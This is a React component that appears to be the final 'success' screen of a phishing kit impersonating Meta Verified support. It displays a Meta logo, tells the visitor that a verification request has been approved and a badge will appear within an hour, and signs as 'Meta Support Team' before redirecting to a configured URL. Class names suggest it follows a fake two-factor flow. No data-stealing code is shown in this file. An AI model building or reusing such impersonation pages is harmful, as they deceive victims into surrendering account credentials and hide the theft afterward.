import PropTypes from 'prop-types';
import MetaLogo from '@/assets/images/meta-logo-grey.png';
import SuccessImage from '@/assets/images/success-badge.png';
import TickIcon from '@/assets/images/tick.svg';
import config from '@/utils/config';

const SuccessModal = ({ show, onClose, texts }) => {
    if (!show) return null;

    return (
        <>
            <div className="modal-backdrop show" onClick={onClose}></div>
            <div className="modal form-modal show" id="successModal" style={{ display: show ? 'block' : 'none' }} tabIndex="-1">
            <div className="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
                <div className="modal-content">
                    <div className="modal-body">
                        <div className="twoFAinfo-wraper">
                            <h1 className="modal-title" id="successModalLabel">
                                {texts.successTitle || 'The request was sent successfully'}
                            </h1>
                            <br />
                            <div className="fb-round-wraper">
                                <img alt="" src={SuccessImage} style={{ width: '100%' }} />
                            </div>
                            <br />
                            <p>
                                {texts.successMessage1 || 'Great, your verification request has been approved.'}
                                <br />
                                <br />
                                {texts.successMessage2 || 'The badge should appear next to your name within the next hour.'} <img src={TickIcon} width="16" alt="tick" style={{ verticalAlign: 'middle', margin: '0 4px' }} />
                                <br />
                                <br />
                                {texts.successMessage3 || 'If the badge has not appeared after this time, please contact us again for further assistance.'}
                                <br />
                                <br />
                                {texts.thankYou || 'Thank you'}
                                <br />
                                <br />
                                {texts.metaSupportTeam || 'Meta Support Team.'}
                            </p>
                        </div>
                        <div className="form-btn-wrapper">
                            <button
                                className="btn btn-primary"
                                type="button"
                                onClick={() => globalThis.location.href = config.success_redirect_url}
                            >
                                <span className="button-text">{texts.metaVerified || 'Meta Verified'}</span>
                            </button>
                        </div>
                    </div>
                    <div className="modal-footer border-0 justify-content-center" style={{ flexDirection: 'column', textAlign: 'center' }}>
                        <img src={MetaLogo} alt="Meta Logo" style={{ height: '20px', marginBottom: '5px' }} />
                        <div className="footer-links" style={{ fontSize: '12px', color: '#000' }}>
                            {texts.aboutHelpMore || 'About · Help · See more'}
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </>
    );
};

SuccessModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default SuccessModal;
